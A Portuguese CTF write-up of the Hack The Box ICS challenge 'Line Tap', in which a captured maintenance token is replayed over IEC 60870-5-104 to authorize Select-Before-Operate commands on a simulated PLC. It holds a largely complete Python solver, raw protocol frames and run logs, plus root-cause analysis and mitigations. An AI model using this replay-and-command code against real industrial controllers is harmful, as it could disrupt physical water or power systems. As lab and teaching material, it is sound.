

# Line Tap — Hack The Box CTF Write-up
## Resolvido por Cesar

## 1. Informações do desafio

**Nome:** Line Tap
**Categoria:** ICS / SCADA
**Protocolo principal:** IEC 60870-5-104
**Arquivo fornecido:** `backup.pcap`

### Descrição

> Stormbound scouts found a forgotten RiverGate PLC beneath Crownspire brineworks, still feeding treated water toward the Ash Vault service tunnels. Vaultrune wardens cut its controller off from normal oversight after the Signet shattered, but old maintenance habits tend to leave traces. Find what still answers and recover the latest checkpoint token before another sealed gate obeys a forged writ.

### Tradução

Os exploradores da Stormbound encontraram um PLC RiverGate esquecido sob as instalações de tratamento de salmoura de Crownspire. O equipamento continuava controlando o fluxo de água em direção aos túneis de serviço do Ash Vault.

Após a quebra do Signet, os guardas desconectaram o controlador dos sistemas normais de supervisão. Entretanto, antigos procedimentos de manutenção deixaram rastros. O objetivo era identificar o que ainda respondia, reproduzir a sequência de manutenção e recuperar o token de checkpoint mais recente.

---

## 2. Objetivo

O desafio fornecia:

* Uma captura de rede chamada `backup.pcap`;
* Um endpoint web;
* Um endpoint correspondente ao PLC;
* Uma sequência legítima de manutenção registrada no PCAP.

O objetivo técnico era:

1. Identificar o protocolo utilizado pelo PLC;
2. Reconstruir as sessões registradas;
3. Recuperar um token antigo de checkpoint;
4. Reproduzir o token na ordem correta;
5. Executar comandos de controle no PLC;
6. Consultar o serviço web após a autorização;
7. Recuperar a flag.

---

## 3. Endpoints da instância

A instância disponibilizou dois serviços:

```text
154.57.164.75:32407  → aplicação web
154.57.164.75:31588  → PLC IEC 60870-5-104
```

Inicialmente, pacotes IEC-104 foram enviados por engano para a porta `32407`.

O servidor respondeu com:

```text
HTTP 400 Bad Request
```

O conteúdo da resposta mostrava que o servidor HTTP estava tentando interpretar os bytes IEC-104 como uma requisição HTTP.

Isso permitiu separar os serviços:

* Porta `32407`: HTTP;
* Porta `31588`: comunicação industrial.

O teste correto foi:

```bash
nc -vz 154.57.164.75 31588
```

Em seguida:

```bash
python3 line_tap_v2.py 154.57.164.75 31588 --web-port 32407
```

---

## 4. Análise inicial do PCAP

O arquivo foi extraído com:

```bash
unzip backup.zip
file backup.pcap
```

Para analisar pelo terminal:

```bash
tcpdump -nn -X -r backup.pcap
```

Também seria possível abrir o arquivo no Wireshark e aplicar:

```text
tcp.port == 2404
```

A porta TCP padrão do IEC 60870-5-104 é `2404`.

A captura mostrou comunicação entre:

```text
172.17.0.1 → cliente de manutenção
172.17.0.5 → PLC
TCP 2404   → IEC 60870-5-104
```

Foram identificadas **duas conexões TCP diferentes**. Essa separação foi essencial para resolver o desafio.

---

## 5. Identificação do IEC 60870-5-104

O primeiro pacote de aplicação enviado ao PLC foi:

```text
68 04 07 00 00 00
```

A resposta foi:

```text
68 04 0b 00 00 00
```

Esses pacotes correspondem a:

```text
STARTDT act → solicitação para iniciar transferência de dados
STARTDT con → confirmação do PLC
```

Na execução contra o endpoint correto, o PLC respondeu ao `STARTDT` e começou a enviar valores de telemetria IEC-104. O equipamento usava o endereço comum `17` e disponibilizava medições nos IOAs `2101`, `2102`, `2103` e `2104`.

### Estrutura básica do APDU

Um frame IEC-104 começa com:

```text
68 LL C1 C2 C3 C4 ASDU...
```

Onde:

* `68`: byte inicial;
* `LL`: comprimento do restante do APDU;
* `C1-C4`: campo de controle;
* `ASDU`: unidade de dados da aplicação.

Os frames principais são:

* **U-frame:** controle da conexão, como `STARTDT`;
* **S-frame:** confirmação de recebimento;
* **I-frame:** transporte de ASDUs e dados reais.

Nos I-frames, o campo de controle contém:

* `N(S)`: número da sequência enviada;
* `N(R)`: próximo número esperado do servidor.

Por isso, não era seguro simplesmente reproduzir todos os bytes do PCAP em uma nova conexão. Os contadores precisavam ser recalculados dinamicamente.

---

## 6. Primeira conexão: replay do checkpoint

A primeira sessão registrada no PCAP continha apenas três passos principais.

### 6.1 STARTDT

```text
68 04 07 00 00 00
```

### 6.2 Confirmação

```text
68 04 0b 00 00 00
```

### 6.3 Comando contendo o checkpoint antigo

```text
68 15 00 00 00 00
68 01 06 00
11 00
04 11 04
bb 32 24 56 bd a8 7c ee
```

Separando a ASDU:

| Campo          |              Valor | Significado                                            |
| -------------- | -----------------: | ------------------------------------------------------ |
| Type ID        |     `104` / `0x68` | Test Command, usado pelo desafio para carregar o token |
| VSQ            |                `1` | Um objeto                                              |
| COT            |                `6` | Activation                                             |
| Common Address |               `17` | Endereço do PLC                                        |
| IOA            |         `0x041104` | `266500` em decimal                                    |
| Dados          | `bb322456bda87cee` | Token de checkpoint antigo                             |

O token capturado foi:

```text
bb322456bda87cee
```

Após enviar esse comando, a conexão era encerrada.

Esse detalhe era fundamental: o PCAP não enviava os comandos operacionais na mesma sessão do token.

---

## 7. Segunda conexão: sessão de manutenção

Logo após fechar a primeira conexão, o cliente abria uma nova conexão TCP para o mesmo PLC.

A segunda sessão executava:

1. `STARTDT`;
2. General Interrogation;
3. Clock Synchronization;
4. Select e Execute no IOA `1101`;
5. Select e Execute no IOA `1201`.

---

## 8. General Interrogation

O comando observado foi:

```text
68 0e 00 00 00 00
64 01 06 00
ff ff
00 00 00
14
```

### Campos

| Campo          |                                 Valor |
| -------------- | ------------------------------------: |
| Type ID        |                   `100` — `C_IC_NA_1` |
| COT            |                      `6` — Activation |
| Common Address |                  `0xFFFF` — broadcast |
| IOA            |                                   `0` |
| QOI            | `20` / `0x14` — station interrogation |

O PLC respondeu com:

* Activation Confirmation, COT `7`;
* Valores de telemetria;
* Activation Termination, COT `10`.

As medições eram enviadas como Type ID `13`, correspondente a valores de ponto flutuante de precisão curta, `M_ME_NC_1`.

A captura mostrou quatro objetos sequenciais:

```text
IOA 2101
IOA 2102
IOA 2103
IOA 2104
```

O bit `0x80` do VSQ indicava endereçamento sequencial.

---

## 9. Sincronização de relógio

O PCAP continha um comando Type ID `103`:

```text
C_CS_NA_1 — Clock Synchronization
```

Exemplo capturado:

```text
68 14 02 00 06 00
67 01 06 00
ff ff
00 00 00
9f 59 0a 14 06 06 1a
```

Os últimos sete bytes representam uma data no formato `CP56Time2a`.

Como o horário do PCAP era antigo, o exploit foi configurado para gerar um novo timestamp com o horário atual:

```python
def cp56time2a(value):
    milliseconds = value.second * 1000 + value.microsecond // 1000

    return struct.pack(
        "<HBBBBB",
        milliseconds,
        value.minute,
        value.hour,
        value.day,
        value.month,
        value.year % 100,
    )
```

Isso evitou que o PLC rejeitasse a manutenção por usar um timestamp antigo.

---

## 10. Comandos Select-Before-Operate

Os objetos `1101` e `1201` utilizavam o mecanismo **Select-Before-Operate**, ou SBO.

Nesse mecanismo, o cliente não pode executar diretamente o comando. Primeiro ele deve selecionar o objeto e, em seguida, executar a operação.

O Type ID utilizado era:

```text
45 — C_SC_NA_1 — Single Command
```

### 10.1 IOA 1101

O endereço `1101` em little-endian aparece como:

```text
4d 04 00
```

#### SELECT ON

```text
68 0e 04 00 08 00
2d 01 06 00
11 00
4d 04 00
81
```

O byte de comando `0x81` contém:

* Estado ON;
* Bit de seleção ativado.

#### EXECUTE ON

```text
68 0e 06 00 0a 00
2d 01 06 00
11 00
4d 04 00
01
```

O byte `0x01` representa:

* Estado ON;
* Operação de execução, sem o bit SELECT.

### 10.2 IOA 1201

O endereço `1201` em little-endian aparece como:

```text
b1 04 00
```

#### SELECT ON

```text
68 0e 08 00 0e 00
2d 01 06 00
11 00
b1 04 00
81
```

#### EXECUTE ON

```text
68 0e 0a 00 10 00
2d 01 06 00
11 00
b1 04 00
01
```

Na primeira tentativa, os comandos apareceram no log, mas a autorização não havia sido ativada na ordem correta. As respostas de seleção e execução podiam ser comparadas com os valores de confirmação do PLC.

---

## 11. Por que o primeiro exploit falhou

A primeira versão do exploit executava tudo em uma única conexão:

```text
STARTDT
GENERAL INTERROGATION
CLOCK SYNC
SELECT/EXECUTE 1101
SELECT/EXECUTE 1201
TOKEN
```

Essa ordem não correspondia ao PCAP.

Além disso, o parser inicial mostrava somente:

```text
cot=7
```

Porém, no hexadecimal bruto, algumas confirmações continham:

```text
47 00
```

O valor `0x47` era composto por:

```text
0x07 → Activation Confirmation
0x40 → bit de confirmação negativa
```

Portanto:

```text
0x47 = Activation Confirmation negativa
```

O parser inicial mascarava o campo com `0x3F`, mostrando apenas o valor `7` e escondendo visualmente o bit negativo.

A correção foi verificar separadamente:

```python
cause = cot_raw & 0x3F
negative = bool(cot_raw & 0x40)
test = bool(cot_raw & 0x80)
```

Com isso, uma confirmação negativa passou a ser exibida corretamente.

A captura hexadecimal completa também mostrava as respostas negativas durante a tentativa incorreta.

---

## 12. Vulnerabilidade explorada

O PLC apresentava uma falha de **replay de autorização** e **stale handoff**.

O token antigo:

```text
bb322456bda87cee
```

ainda era aceito para iniciar uma pequena janela de manutenção.

A falha possuía as seguintes características:

1. O token capturado podia ser reutilizado;
2. Não havia um nonce novo por sessão;
3. O token não era invalidado após uso;
4. A autorização persistia entre duas conexões TCP;
5. Os comandos operacionais eram aceitos na segunda conexão;
6. A janela de autorização tinha duração curta.

A aplicação web confirmou isso com:

```json
{
  "authorized": true,
  "authorized_ttl": 19
}
```

Isso significa que o replay abriu uma janela de aproximadamente 19 segundos para executar os comandos.

---

## 13. Fluxo corrigido do exploit

O fluxo final foi:

```text
┌───────────────────────────────────────┐
│ Conexão 1 — autenticação por replay   │
├───────────────────────────────────────┤
│ STARTDT act                           │
│ STARTDT con                           │
│ Enviar token bb322456bda87cee         │
│ Fechar conexão                        │
└───────────────────────────────────────┘
                    │
                    │ imediatamente
                    ▼
┌───────────────────────────────────────┐
│ Conexão 2 — manutenção                │
├───────────────────────────────────────┤
│ STARTDT act                           │
│ General Interrogation                 │
│ Clock Synchronization                 │
│ SELECT ON 1101                        │
│ EXECUTE ON 1101                       │
│ SELECT ON 1201                        │
│ EXECUTE ON 1201                       │
└───────────────────────────────────────┘
                    │
                    ▼
┌───────────────────────────────────────┐
│ Serviço web                           │
├───────────────────────────────────────┤
│ GET /status.json                      │
│ GET /alarms                           │
│ Recuperar flag e novo token           │
└───────────────────────────────────────┘
```

---

## 14. Implementação do solver

O exploit foi dividido em três componentes.

### 14.1 Fase de autenticação

```python
def auth_phase(host, port, timeout, token):
    client = IEC104(host, port, timeout)

    try:
        client.connect("fase 1 / replay do checkpoint")
        client.start()

        private_asdu = client.asdu(
            typ=104,
            vsq=1,
            cot=6,
            ca=17,
            ioa=0x041104,
            data=token,
        )

        client.send_asdu(
            private_asdu,
            f"CHECKPOINT TOKEN {token.hex()}",
        )

        client.receive(0.18)
    finally:
        client.close()
```

Essa função:

1. Abre uma conexão;
2. Envia `STARTDT`;
3. Envia o token antigo;
4. Fecha imediatamente a conexão.

### 14.2 Fase de manutenção

```python
def maintenance_phase(host, port, timeout, wait):
    client = IEC104(host, port, timeout)

    client.connect("fase 2 / sessão de manutenção")
    client.start()

    client.send_asdu(
        client.asdu(100, 1, 6, 0xFFFF, 0, b"\x14"),
        "GENERAL INTERROGATION",
    )

    client.send_asdu(
        client.asdu(
            103,
            1,
            6,
            0xFFFF,
            0,
            cp56time2a(datetime.now()),
        ),
        "CLOCK SYNC atual",
    )

    first = client.sbo(1101)
    second = client.sbo(1201)

    return client, first and second
```

### 14.3 Construção dinâmica dos I-frames

```python
def build_i(self, asdu):
    control = struct.pack(
        "<HH",
        self.tx_seq << 1,
        self.rx_seq << 1,
    )

    frame = (
        bytes((0x68, len(asdu) + 4))
        + control
        + asdu
    )

    self.tx_seq += 1
    return frame
```

O script mantém:

```text
tx_seq → próximo N(S)
rx_seq → próximo N(R)
```

Sempre que recebe um I-frame:

```python
self.rx_seq = max(self.rx_seq, apdu.ns + 1)
```

Isso permite reproduzir a lógica do PCAP sem reutilizar contadores antigos.

---

## 15. Execução final

Comando utilizado:

```bash
python3 line_tap_v2.py \
    154.57.164.75 \
    31588 \
    --web-port 32407
```

O token antigo foi enviado com sucesso:

```text
[>] CHECKPOINT TOKEN bb322456bda87cee
```

Na segunda conexão, o PLC aceitou o comando no IOA `1101`:

```text
[+] EXECUTE 1101 aceito
```

Depois aceitou o IOA `1201`:

```text
[+] EXECUTE 1201 aceito
```

O exploit então consultou o serviço HTTP.

---

## 16. Descoberta dos endpoints web

A página principal estava disponível em:

```text
http://154.57.164.75:32407/
```

O título da aplicação era:

```text
Frostline RLY-104 Feeder Guard RTU
```

O crawler procurou links, scripts, chamadas `fetch()` e alguns endpoints comuns.

Foram encontrados:

```text
/status.json
/alarms
```

### 16.1 Estado do PLC

Requisição:

```http
GET /status.json
```

Resposta:

```json
{
  "plc": {
    "vendor": "Frostline Controls",
    "product": "RLY-104",
    "model": "Frostline RLY-104 Feeder Guard RTU",
    "revision": "2.8.4",
    "application": "Crownspire East Feeder Transfer",
    "common_address": 17
  },
  "scan": 3406,
  "authorized": true,
  "authorized_ttl": 19
}
```

O campo:

```json
"authorized": true
```

confirmava que o token antigo havia ativado a sessão de manutenção.

### 16.2 Alarmes

Requisição:

```http
GET /alarms
```

Resposta:

```json
{
  "alarms": [
    {
      "id": "RLY104-PHASE-SLIP",
      "severity": "CRIT",
      "message": "52-T phase-slip trip asserted - TOKEN HTB{104_stale_handoff_tripped_52t_ff3d357e81ecbb98911f6c06f23137dd}"
    }
  ]
}
```

---

## 17. Flag

```text
HTB{104_stale_handoff_tripped_52t_ff3d357e81ecbb98911f6c06f23137dd}
```

---

## 18. Tokens encontrados

### Token antigo capturado no PCAP

```text
bb322456bda87cee
```

Esse token foi utilizado para realizar o replay e ativar a janela de manutenção.

### Token de checkpoint mais recente

```text
ff3d357e81ecbb98911f6c06f23137dd
```

Esse token apareceu no alarme após a execução dos comandos e também está presente como sufixo da flag.

---

## 19. Resumo técnico

A resolução consistiu em:

1. Extrair e analisar o `backup.pcap`;
2. Identificar IEC 60870-5-104 pela porta `2404` e pelos frames iniciados em `0x68`;
3. Separar as duas conexões TCP presentes na captura;
4. Recuperar o token antigo `bb322456bda87cee`;
5. Identificar que o token era transmitido em uma ASDU Type ID `104`;
6. Reconstruir os contadores `N(S)` e `N(R)` dinamicamente;
7. Enviar o token em uma conexão separada;
8. Abrir imediatamente uma segunda conexão;
9. Executar General Interrogation;
10. Sincronizar o relógio;
11. Realizar SBO nos IOAs `1101` e `1201`;
12. Confirmar que os comandos foram aceitos;
13. Consultar `/status.json`;
14. Confirmar que `authorized` estava ativo;
15. Consultar `/alarms`;
16. Recuperar a flag.

---

## 20. Causa raiz

A vulnerabilidade central foi uma combinação de:

* Replay de token;
* Token reutilizável;
* Falta de proteção contra repetição;
* Autorização persistente entre conexões;
* Ausência de vínculo entre token e sessão TCP;
* Janela temporal de manutenção reutilizável;
* Confiança em uma sequência antiga de operações.

O nome da flag resume a falha:

```text
104_stale_handoff
```

O termo `104` referencia o protocolo IEC-104, enquanto `stale_handoff` descreve a reutilização de uma autorização antiga entre duas sessões.

---

## 21. Mitigações

Para impedir esse ataque, o PLC deveria:

1. Utilizar tokens de uso único;
2. Invalidar o token imediatamente após sua utilização;
3. Vincular a autorização à conexão autenticada;
4. Exigir nonce ou challenge aleatório;
5. Assinar ou autenticar criptograficamente as mensagens;
6. Rejeitar timestamps antigos;
7. Não compartilhar autorização entre conexões TCP;
8. Aplicar autenticação e criptografia, como IEC 62351;
9. Registrar tentativas de replay;
10. Exigir nova autenticação antes de comandos críticos;
11. Restringir o acesso à porta IEC-104 por rede e firewall;
12. Remover informações sensíveis dos endpoints web de monitoramento.

---

## 22. Conclusão

O desafio simulava uma falha realista em um ambiente ICS no qual uma credencial antiga de manutenção ainda podia ser reutilizada.

O ponto mais importante não era apenas recuperar os bytes do token, mas reproduzir fielmente o comportamento observado no PCAP:

```text
token em uma conexão
→ encerramento
→ nova conexão
→ comandos de manutenção
```

Ao respeitar essa ordem, o PLC manteve a autorização ativa durante a segunda conexão e aceitou os comandos nos objetos `1101` e `1201`.

A mudança operacional gerou um alarme crítico na interface web, revelando o token mais recente e a flag final:

```text
HTB{104_stale_handoff_tripped_52t_ff3d357e81ecbb98911f6c06f23137dd}
```

### Comando do exploit1
```
┌──(t0x1n㉿154)-[~/Desktop/CTF/ICS]
└─$ python3 line2.py 154.57.164.75 31588 --current-clock

```

### Resultado do Exploit1
```                                                                                                                                            
┌──(t0x1n㉿154)-[~/Desktop/CTF/ICS]
└─$ python3 lin2.py 154.57.164.75 31588 --web-port 32407    

[+] fase 1 / replay do checkpoint: conectado em 154.57.164.75:31588
[>] STARTDT act: 68 04 07 00 00 00
[<] U: 68 04 0b 00 00 00
[>] CHECKPOINT TOKEN bb322456bda87cee: 68 15 00 00 00 00 68 01 06 00 11 00 04 11 04 bb 32 24 56 bd a8 7c ee
[<] I ns=0 nr=0: type=13 vsq=0x84 cot=1 ca=17 ioa=2101 data=00 00 34 41 00 8f c2 75 40 00 9a 99 69 41 00 00 00 a4 42 00

[+] fase 2 / sessão de manutenção: conectado em 154.57.164.75:31588
[>] STARTDT act: 68 04 07 00 00 00
[<] U: 68 04 0b 00 00 00
[>] GENERAL INTERROGATION: 68 0e 00 00 00 00 64 01 06 00 ff ff 00 00 00 14
[<] I ns=0 nr=1: type=100 vsq=0x01 cot=7 ca=17 ioa=0 data=14
[<] I ns=1 nr=1: type=13 vsq=0x84 cot=20 ca=17 ioa=2101 data=0a d7 33 41 00 e1 7a 74 40 00 cd cc 64 41 00 00 00 a4 42 00
[<] I ns=2 nr=1: type=100 vsq=0x01 cot=10 ca=17 ioa=0 data=14
[>] CLOCK SYNC atual: 68 14 02 00 06 00 67 01 06 00 ff ff 00 00 00 8c 68 01 03 1a 07 1a
[<] I ns=3 nr=2: type=103 vsq=0x01 cot=7 ca=17 ioa=0 data=8c 68 01 03 1a 07 1a
[>] SELECT ON ioa=1101: 68 0e 04 00 08 00 2d 01 06 00 11 00 4d 04 00 81
[<] I ns=4 nr=3: type=45 vsq=0x01 cot=7 ca=17 ioa=1101 data=81
[>] EXECUTE ON ioa=1101: 68 0e 06 00 0a 00 2d 01 06 00 11 00 4d 04 00 01
[<] I ns=5 nr=4: type=45 vsq=0x01 cot=7 ca=17 ioa=1101 data=01
[<] I ns=6 nr=4: type=45 vsq=0x01 cot=10 ca=17 ioa=1101 data=81
[<] I ns=7 nr=4: type=13 vsq=0x84 cot=1 ca=17 ioa=2101 data=0a d7 33 41 00 e1 7a 74 40 00 cd cc 64 41 00 00 00 a4 42 00
[+] EXECUTE 1101 aceito
[>] SELECT ON ioa=1201: 68 0e 08 00 10 00 2d 01 06 00 11 00 b1 04 00 81
[<] I ns=8 nr=5: type=45 vsq=0x01 cot=7 ca=17 ioa=1201 data=81
[>] EXECUTE ON ioa=1201: 68 0e 0a 00 12 00 2d 01 06 00 11 00 b1 04 00 01
[<] I ns=9 nr=6: type=45 vsq=0x01 cot=7 ca=17 ioa=1201 data=01
[<] I ns=10 nr=6: type=45 vsq=0x01 cot=10 ca=17 ioa=1201 data=81
[+] EXECUTE 1201 aceito
[+] Os dois comandos foram aceitos; aguardando token/flag...
[<] I ns=11 nr=6: type=13 vsq=0x84 cot=1 ca=17 ioa=2101 data=0a d7 33 41 00 e1 7a 74 40 00 cd cc 64 41 00 00 00 a4 42 00
[<] I ns=12 nr=6: type=13 vsq=0x84 cot=1 ca=17 ioa=2101 data=0a d7 33 41 00 e1 7a 74 40 00 cd cc 64 41 00 00 00 a4 42 00
[<] I ns=13 nr=6: type=13 vsq=0x84 cot=1 ca=17 ioa=2101 data=0a d7 33 41 00 e1 7a 74 40 00 cd cc 64 41 00 00 00 a4 42 00
[<] I ns=14 nr=6: type=13 vsq=0x84 cot=1 ca=17 ioa=2101 data=0a d7 33 41 00 e1 7a 74 40 00 cd cc 64 41 00 00 00 a4 42 00
[>] GENERAL INTERROGATION final: 68 0e 0c 00 1e 00 64 01 06 00 ff ff 00 00 00 14
[<] I ns=15 nr=7: type=100 vsq=0x01 cot=7 ca=17 ioa=0 data=14
[<] I ns=16 nr=7: type=13 vsq=0x84 cot=20 ca=17 ioa=2101 data=00 00 00 00 00 00 00 00 00 00 cd cc 7c 41 00 00 00 aa 42 00
[<] I ns=17 nr=7: type=100 vsq=0x01 cot=10 ca=17 ioa=0 data=14

[*] Consultando serviço web em http://154.57.164.75:32407/
[HTTP 200] http://154.57.164.75:32407/ (text/html; charset=utf-8) <!doctype html> <html lang="en"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Frostline RLY-104 Feeder Guard RTU</title>   <style>     :root {       color-scheme: light;    
[HTTP 404] http://154.57.164.75:32407/api/status (text/plain; charset=utf-8) not found 
[HTTP 404] http://154.57.164.75:32407/api/checkpoint (text/plain; charset=utf-8) not found 
[HTTP 404] http://154.57.164.75:32407/checkpoint (text/plain; charset=utf-8) not found 
[HTTP 404] http://154.57.164.75:32407/latest (text/plain; charset=utf-8) not found 
[HTTP 404] http://154.57.164.75:32407/status (text/plain; charset=utf-8) not found 
[HTTP 404] http://154.57.164.75:32407/flag (text/plain; charset=utf-8) not found 
[HTTP 200] http://154.57.164.75:32407/status.json (application/json) {"plc":{"vendor":"Frostline Controls","product":"RLY-104","model":"Frostline RLY-104 Feeder Guard RTU","revision":"2.8.4","application":"Crownspire East Feeder Transfer","common_address":17},"scan":3406,"authorized":true,"authorized_ttl":19
[HTTP 200] http://154.57.164.75:32407/alarms (application/json) {"alarms":[{"id":"RLY104-PHASE-SLIP","severity":"CRIT","message":"52-T phase-slip trip asserted - TOKEN HTB{104_stale_handoff_tripped_52t_ff3d357e81ecbb98911f6c06f23137dd}"}]}

========================================================================
[FLAG WEB] HTB{104_stale_handoff_tripped_52t_ff3d357e81ecbb98911f6c06f23137dd}
========================================================================
[TOKEN WEB] ff3d357e81ecbb98911f6c06f23137dd
```

## Exploit1
```
┌──(t0x1n㉿154)-[~/Desktop/CTF/ICS]
└─$ cat lin2.py
"""Line Tap solver - replay correto em duas conexões IEC 60870-5-104.

Fluxo do backup.pcap:
  conexão 1: STARTDT -> C_TS_NA_1 privado com token -> fecha
  conexão 2: STARTDT -> GI -> clock sync -> SBO 1101 -> SBO 1201

Também consulta/caminha pelo serviço HTTP opcional e procura HTB{...} ou tokens.
"""
from __future__ import annotations

import argparse
import datetime as dt
import html
import re
import socket
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass

FLAG_RE = re.compile(rb"HTB\{[^}\r\n]{1,256}\}")
HEX_TOKEN_RE = re.compile(rb"(?<![0-9a-fA-F])[0-9a-fA-F]{16,64}(?![0-9a-fA-F])")
CAPTURED_TOKEN = bytes.fromhex("bb322456bda87cee")
PRIVATE_IOA = 0x041104


def hx(data: bytes) -> str:
    return data.hex(" ")


def cp56time2a(value: dt.datetime) -> bytes:
    ms = value.second * 1000 + value.microsecond // 1000
    return struct.pack("<HBBBBB", ms, value.minute, value.hour, value.day, value.month, value.year % 100)


@dataclass
class APDU:
    raw: bytes
    kind: str
    ns: int | None = None
    nr: int | None = None
    asdu: bytes = b""


class IEC104:
    def __init__(self, host: str, port: int, timeout: float = 1.5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock: socket.socket | None = None
        self.rxbuf = bytearray()
        self.all_rx = bytearray()
        self.tx_seq = 0
        self.rx_seq = 0
        self.flags: list[bytes] = []

    def connect(self, label: str) -> None:
        self.sock = socket.create_connection((self.host, self.port), timeout=5)
        self.sock.settimeout(self.timeout)
        print(f"\n[+] {label}: conectado em {self.host}:{self.port}")

    def close(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def send_raw(self, data: bytes, label: str) -> None:
        assert self.sock is not None
        print(f"[>] {label}: {hx(data)}")
        self.sock.sendall(data)

    def send_u(self, control: bytes, label: str) -> None:
        self.send_raw(b"\x68\x04" + control, label)

    def asdu(self, typ: int, vsq: int, cot: int, ca: int, ioa: int, data: bytes = b"") -> bytes:
        return bytes((typ, vsq)) + struct.pack("<HH", cot, ca) + ioa.to_bytes(3, "little") + data

    def build_i(self, asdu: bytes) -> bytes:
        control = struct.pack("<HH", self.tx_seq << 1, self.rx_seq << 1)
        frame = bytes((0x68, len(asdu) + 4)) + control + asdu
        self.tx_seq += 1
        return frame

    def send_asdu(self, asdu: bytes, label: str) -> None:
        self.send_raw(self.build_i(asdu), label)

    def _extract(self) -> list[bytes]:
        frames: list[bytes] = []
        while True:
            try:
                start = self.rxbuf.index(0x68)
            except ValueError:
                self.rxbuf.clear()
                break
            if start:
                del self.rxbuf[:start]
            if len(self.rxbuf) < 2:
                break
            total = self.rxbuf[1] + 2
            if len(self.rxbuf) < total:
                break
            frames.append(bytes(self.rxbuf[:total]))
            del self.rxbuf[:total]
        return frames

    @staticmethod
    def parse(raw: bytes) -> APDU:
        if len(raw) < 6:
            return APDU(raw, "invalid")
        c = raw[2:6]
        if (c[0] & 1) == 0:
            return APDU(
                raw,
                "I",
                struct.unpack("<H", c[:2])[0] >> 1,
                struct.unpack("<H", c[2:])[0] >> 1,
                raw[6:],
            )
        if (c[0] & 3) == 1:
            return APDU(raw, "S", nr=struct.unpack("<H", c[2:])[0] >> 1)
        return APDU(raw, "U")

    @staticmethod
    def describe_asdu(asdu: bytes) -> str:
        if len(asdu) < 6:
            return f"ASDU curto: {hx(asdu)}"
        typ, vsq = asdu[0], asdu[1]
        cot_raw = struct.unpack("<H", asdu[2:4])[0]
        cause = cot_raw & 0x3f
        negative = bool(cot_raw & 0x40)
        test = bool(cot_raw & 0x80)
        ca = struct.unpack("<H", asdu[4:6])[0]
        out = f"type={typ} vsq=0x{vsq:02x} cot={cause}"
        if negative:
            out += " NEGATIVE"
        if test:
            out += " TEST"
        out += f" ca={ca}"
        if len(asdu) >= 9:
            ioa = int.from_bytes(asdu[6:9], "little")
            out += f" ioa={ioa} data={hx(asdu[9:])}"
        return out

    def scan(self, data: bytes) -> None:
        for m in FLAG_RE.finditer(data):
            flag = m.group(0)
            if flag not in self.flags:
                self.flags.append(flag)
                print("\n" + "=" * 72)
                print("[FLAG]", flag.decode("ascii", "replace"))
                print("=" * 72)

    def receive(self, duration: float) -> list[APDU]:
        assert self.sock is not None
        deadline = time.monotonic() + duration
        result: list[APDU] = []
        while time.monotonic() < deadline:
            self.sock.settimeout(max(0.05, min(self.timeout, deadline - time.monotonic())))
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                continue
            if not chunk:
                break
            self.all_rx.extend(chunk)
            self.rxbuf.extend(chunk)
            self.scan(chunk)
            for raw in self._extract():
                apdu = self.parse(raw)
                result.append(apdu)
                if apdu.kind == "I" and apdu.ns is not None:
                    self.rx_seq = max(self.rx_seq, apdu.ns + 1)
                    print(f"[<] I ns={apdu.ns} nr={apdu.nr}: {self.describe_asdu(apdu.asdu)}")
                else:
                    print(f"[<] {apdu.kind}: {hx(raw)}")
        self.scan(bytes(self.all_rx))
        return result

    @staticmethod
    def negative_confirmation(frames: list[APDU], typ: int, ioa: int) -> bool:
        for frame in frames:
            a = frame.asdu
            if frame.kind != "I" or len(a) < 9 or a[0] != typ:
                continue
            if int.from_bytes(a[6:9], "little") != ioa:
                continue
            cot_raw = struct.unpack("<H", a[2:4])[0]
            if (cot_raw & 0x3f) == 7 and (cot_raw & 0x40):
                return True
        return False

    def start(self) -> None:
        self.send_u(b"\x07\x00\x00\x00", "STARTDT act")
        self.receive(0.25)

    def sbo(self, ioa: int) -> bool:
        self.send_asdu(self.asdu(45, 1, 6, 17, ioa, b"\x81"), f"SELECT ON ioa={ioa}")
        selected = self.receive(0.25)
        if self.negative_confirmation(selected, 45, ioa):
            print(f"[-] SELECT {ioa} rejeitado")
            return False

        self.send_asdu(self.asdu(45, 1, 6, 17, ioa, b"\x01"), f"EXECUTE ON ioa={ioa}")
        executed = self.receive(0.4)
        if self.negative_confirmation(executed, 45, ioa):
            print(f"[-] EXECUTE {ioa} rejeitado (COT 0x47)")
            return False
        print(f"[+] EXECUTE {ioa} aceito")
        return True


def auth_phase(host: str, port: int, timeout: float, token: bytes) -> None:
    c = IEC104(host, port, timeout)
    try:
        c.connect("fase 1 / replay do checkpoint")
        c.start()
        private = c.asdu(104, 1, 6, 17, PRIVATE_IOA, token)
        c.send_asdu(private, f"CHECKPOINT TOKEN {token.hex()}")
        c.receive(0.18)
        # O PCAP fecha esta sessão e abre a manutenção imediatamente.
    finally:
        c.close()


def maintenance_phase(host: str, port: int, timeout: float, wait: float, old_clock: bool) -> tuple[IEC104, bool]:
    c = IEC104(host, port, timeout)
    ok = False
    try:
        c.connect("fase 2 / sessão de manutenção")
        c.start()

        gi = c.asdu(100, 1, 6, 0xFFFF, 0, b"\x14")
        c.send_asdu(gi, "GENERAL INTERROGATION")
        c.receive(0.35)

        if old_clock:
            stamp = bytes.fromhex("9f590a1406061a")
            label = "CLOCK SYNC do PCAP"
        else:
            stamp = cp56time2a(dt.datetime.now())
            label = "CLOCK SYNC atual"
        c.send_asdu(c.asdu(103, 1, 6, 0xFFFF, 0, stamp), label)
        c.receive(0.25)

        ok1 = c.sbo(1101)
        ok2 = c.sbo(1201)
        ok = ok1 and ok2

        if ok:
            print("[+] Os dois comandos foram aceitos; aguardando token/flag...")
        else:
            print("[-] A autorização não ficou ativa; não adianta fazer READ nos IOAs de comando.")

        c.receive(wait)
        c.send_asdu(gi, "GENERAL INTERROGATION final")
        c.receive(0.8)
        c.scan(bytes(c.all_rx))
        return c, ok
    except Exception:
        c.close()
        raise


def http_get(url: str, timeout: float) -> tuple[int, bytes, str]:
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 LineTapSolver/2"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        body = r.read(1_000_000)
        ctype = r.headers.get("Content-Type", "")
        return r.status, body, ctype


def crawl_http(host: str, port: int, timeout: float) -> list[bytes]:
    base = f"http://{host}:{port}/"
    queue = [base]
